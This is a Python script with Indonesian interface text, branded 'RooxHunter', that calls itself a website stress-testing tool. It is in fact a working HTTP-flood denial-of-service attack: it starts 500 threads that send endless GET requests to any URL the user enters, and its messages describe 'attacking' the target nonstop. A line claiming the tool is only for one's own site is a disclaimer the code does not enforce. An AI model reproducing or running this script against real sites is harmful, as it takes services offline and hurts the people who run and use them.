import os
import sys
import time
import threading
import requests

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

def banner():
    os.system("clear")
    print(f"""{GREEN}
██████╗  ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ ██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
██╔══██╗██╔═══██╗██╔════╝ ██║  ██║██║   ██║██╔══██╗██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝██║   ██║██║  ███╗███████║██║   ██║██████╔╝██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
██╔═══╝ ██║   ██║██║   ██║██╔══██║██║   ██║██╔═══╝ ██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
██║     ╚██████╔╝╚██████╔╝██║  ██║╚██████╔╝██║     ╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{RESET}""")
    print(f"{CYAN}Tools Uji Kekuatan Website Anda - RooxHunter vHard\n{RESET}")
    input("Tekan ENTER untuk melihat panduan penggunaan...")

def panduan():
    print(f"""{GREEN}
=====================================
         Panduan Penggunaan
=====================================
- Tools ini hanya untuk uji kekuatan web milik sendiri!
- Metode: Mengirim 10.000+ permintaan nonstop.
- Hentikan manual dengan CTRL + C
- Target HARUS menyertakan protokol (http/https)
Contoh penggunaan: https://example.com
====================================={RESET}
""")

def ddos(target_url):
    def serang():
        while True:
            try:
                res = requests.get(target_url)
                print(f"{GREEN}[+] Request sent => {res.status_code}{RESET}")
            except:
                print(f"{RED}[-] Gagal mengirim request!{RESET}")

    threads = []
    for i in range(500):  # Banyak thread
        t = threading.Thread(target=serang)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

def main():
    banner()
    panduan()
    target = input(f"{CYAN}Masukkan URL Target: {RESET}")
    print(f"{GREEN}[!] Menyerang {target} tanpa henti... CTRL+C untuk stop.{RESET}")
    time.sleep(2)
    ddos(target)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Serangan dihentikan oleh user.{RESET}")
        sys.exit()
